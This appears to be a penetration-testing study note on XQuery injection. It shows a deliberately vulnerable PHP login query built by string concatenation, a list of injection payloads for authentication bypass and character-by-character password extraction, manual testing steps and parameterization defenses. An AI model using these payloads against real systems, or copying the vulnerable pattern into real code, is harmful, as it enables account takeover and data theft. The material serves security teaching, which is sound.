---
tags: [vapt, injection, advanced]
difficulty: advanced
module: "10 - Injection Attacks"
topic: "10.12 XQuery Injection"
---

# 10.12 — XQuery Injection

## What is XQuery?

XQuery is a query language for XML databases (like MarkLogic, BaseX, eXist-db). It's the XML equivalent of SQL for relational databases. XQuery injection follows the same principles as SQL injection — user input is injected into a query string.

```
VULNERABLE CODE (PHP):
  $query = "doc('users.xml')//user[username='" . $username . "' and password='" . $password . "']";
  $result = $xpath->evaluate($query);
  
NORMAL QUERY:
  doc('users.xml')//user[username='john' and password='secret']
  
INJECT:
  username: john' or '1'='1
  QUERY: doc('users.xml')//user[username='john' or '1'='1' and password='anything']
  → Always-true condition → authentication bypass!
```

---

## XQuery Injection Payloads

```xquery
(: AUTHENTICATION BYPASS: :)
' or '1'='1
' or ''='
john' or 1=1 or '

(: EXTRACT DATA - boolean: :)
' or substring(doc('users.xml')//user[1]/password,1,1)='a' or '1'='2

(: EXTRACT ALL USERS: :)
' or true() or '

(: COMMENT (XQuery uses :) for comments): :)
john' (: this is a comment :) or '1'='1

(: XPATH FUNCTIONS IN XQUERY: :)
' or contains(password,'a') or '
' or starts-with(username,'adm') or '
' or string-length(password)>5 or '

(: XQUERY-SPECIFIC: :)
' or doc('sensitive.xml')//secret[1]/text()='x' or 'a'='b
```

---

## Testing

```bash
# STEP 1: INJECT SINGLE QUOTE:
?username=test'
# Error? → possible XQuery injection

# STEP 2: ALWAYS-TRUE TEST:
?username=admin' or '1'='1&password=anything
# Login succeeds? → XQuery injection!

# STEP 3: ERROR-BASED:
# XQuery errors are often verbose → reveal database type/structure

# DATABASES THAT USE XQUERY:
# MarkLogic (common in enterprise/government)
# BaseX (open source)
# eXist-db (open source)
# Saxon (Java-based)
```

---

## Defense

```
PROTECTION:
  Use parameterized XQuery:
  MarkLogic:
    cts:query("..."), use variables
    xdmp:xquery-eval with external variables
  
  BaseX:
    Use @parameter syntax
  
  ALWAYS:
  → Never concatenate user input into XQuery strings
  → Escape single quotes: ' → ''
  → Use allowlists for username/password chars
```

---

## Related Notes
- [[02 - XPath Injection]] — XPath (simpler version)
- [[03 - XML Injection]] — XML manipulation
- [[Module 06 - SQL Injection]] — parallel relational DB injection
